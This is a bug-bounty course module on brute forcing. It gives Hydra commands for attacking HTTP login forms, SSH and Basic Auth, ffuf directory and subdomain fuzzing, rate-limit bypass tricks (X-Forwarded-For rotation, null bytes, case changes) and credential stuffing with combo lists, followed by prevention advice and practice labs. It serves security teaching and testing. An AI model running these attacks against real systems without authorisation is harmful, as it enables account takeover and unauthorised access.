# 🔓 Module 10: Brute Forcing

> **Level:** 🟡 Intermediate | **Time:** ~2 hours | **Prerequisites:** Module 01-09

---

## 📖 Overview

Brute forcing involves systematically trying many username/password combinations, paths, or values to gain unauthorized access or discover hidden resources. This module covers authentication brute forcing, directory fuzzing, and rate limit bypass techniques used in professional security assessments.

---

## ❓ Why It Matters

Many web applications lack proper rate limiting, account lockout, or CAPTCHA — making them vulnerable to automated credential attacks. Missing rate limits on sensitive endpoints is a commonly rewarded finding, even without successful exploitation.

---

## 🌍 Real-World Example

A researcher discovered that a company's admin login portal at `/admin/login` had no rate limiting or lockout mechanism. Using a list of common admin passwords, they successfully authenticated within minutes. This was reported as a **Critical** vulnerability worth a $3,000 bounty.

---

## 📋 Step-by-Step Methodology

### Authentication Brute Force

```
1. Find login endpoints
   /login, /admin/login, /api/auth, /signin

2. Test for protections:
   - Rate limiting (try 10+ rapid requests)
   - Account lockout
   - CAPTCHA
   - IP-based blocking

3. If no protection exists:
   - Use targeted wordlists
   - Try credential stuffing
   - Report as vulnerability

4. Rate limit bypass techniques:
   - X-Forwarded-For: header rotation
   - Null bytes in username
   - Different case variations
```

### Directory/Content Discovery

```
1. Start with common wordlist
2. Note response codes and sizes
3. Investigate 200, 301, 302, 403 responses
4. Fuzz with relevant extensions
5. Investigate interesting directories recursively
```

---

## 🛠️ Tools Used

| Tool | Purpose | Speed |
|------|---------|-------|
| **Hydra** | Network login brute force | Fast |
| **Medusa** | Parallel login brute force | Fast |
| **ffuf** | Web fuzzing (dirs, params) | Very Fast |
| **gobuster** | Directory enumeration | Fast |
| **Burp Intruder** | Web application brute force | Slow (Community) |
| **Turbo Intruder** | Fast Burp intruder | Very Fast |
| **wfuzz** | Web fuzzer with filtering | Fast |

---

## 💡 Payload Examples

### Hydra — Authentication Brute Force

```bash
# HTTP POST login form
hydra -l admin -P /usr/share/wordlists/rockyou.txt target.com \
    http-post-form "/login:username=^USER^&password=^PASS^:Invalid password"

# Multiple usernames
hydra -L usernames.txt -P passwords.txt target.com \
    http-post-form "/login:user=^USER^&pass=^PASS^:Login failed"

# SSH brute force
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://target.com

# HTTP Basic Auth
hydra -l admin -P passwords.txt target.com http-get /admin

# Rate limit bypass with delay
hydra -l admin -P passwords.txt target.com \
    http-post-form "/login:user=^USER^&pass=^PASS^:Failed" \
    -W 3    # Wait 3 seconds between attempts
```

### ffuf — Directory Fuzzing

```bash
# Basic directory enumeration
ffuf -u https://target.com/FUZZ -w /opt/SecLists/Discovery/Web-Content/common.txt

# With file extensions
ffuf -u https://target.com/FUZZ \
    -w /opt/SecLists/Discovery/Web-Content/common.txt \
    -e .php,.html,.js,.txt,.bak,.old

# Filter by status code
ffuf -u https://target.com/FUZZ \
    -w wordlist.txt \
    -fc 404             # Filter 404s

# Filter by size (to remove false positives)
ffuf -u https://target.com/FUZZ \
    -w wordlist.txt \
    -fs 1234            # Filter responses with size 1234

# POST parameter fuzzing
ffuf -u https://target.com/api -X POST \
    -d "param=FUZZ" \
    -w /opt/SecLists/Discovery/Web-Content/burp-parameter-names.txt \
    -H "Content-Type: application/x-www-form-urlencoded"

# Subdomain fuzzing
ffuf -u https://FUZZ.target.com \
    -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt \
    -H "Host: FUZZ.target.com"

# VHost discovery
ffuf -u https://target.com \
    -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt \
    -H "Host: FUZZ.target.com" \
    -fc 301,302
```

### Rate Limit Bypass

```bash
# Bypass IP-based rate limiting with X-Forwarded-For rotation
# Create IP list
for i in $(seq 1 255); do echo "1.1.1.$i"; done > ips.txt

# Use Burp Intruder with X-Forwarded-For: §1.1.1.1§

# Null byte bypass
username=admin%00&password=pass

# Case variation bypass
username=Admin&password=pass
username=ADMIN&password=pass

# Add whitespace
username=admin &password=pass
username= admin&password=pass
```

### Credential Stuffing

```bash
# Download breach data (only use for testing with permission)
# Use have-i-been-pwned API to check emails
curl "https://haveibeenpwned.com/api/v3/breachedaccount/test@example.com"

# With Hydra using combo list (user:pass format)
hydra -C combo_list.txt target.com \
    http-post-form "/login:user=^USER^&pass=^PASS^:failed"
```

---

## 🛡️ Prevention

| Issue | Prevention |
|-------|-----------|
| No rate limiting | Implement rate limiting (e.g., 5 attempts per minute) |
| No lockout | Lock accounts after N failed attempts |
| No CAPTCHA | Add CAPTCHA on sensitive forms after N failures |
| Weak passwords | Enforce strong password policy |
| No MFA | Implement multi-factor authentication |

```python
# Flask-Limiter example
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address

limiter = Limiter(app, key_func=get_remote_address)

@app.route('/login', methods=['POST'])
@limiter.limit("5 per minute")  # Max 5 login attempts per minute
def login():
    # login logic
    pass
```

---

## 🧪 Practice Labs

| Lab | Link | Exercise |
|-----|------|---------|
| PortSwigger | [portswigger.net/web-security/authentication](https://portswigger.net/web-security/authentication) | Brute force auth labs |
| DVWA | localhost | Brute Force module |
| TryHackMe | [tryhackme.com](https://tryhackme.com) | "Crack the Hash" room |
| HackTheBox | [hackthebox.com](https://hackthebox.com) | Password cracking challenges |

---

<div align="center">

[← Module 09: Client-Side Attacks](../09.%20Client%20Side%20Attacks/README.md) | [Next Module: Security Misconfigurations →](../11.%20Security%20Misconfigurations/README.md)

</div>
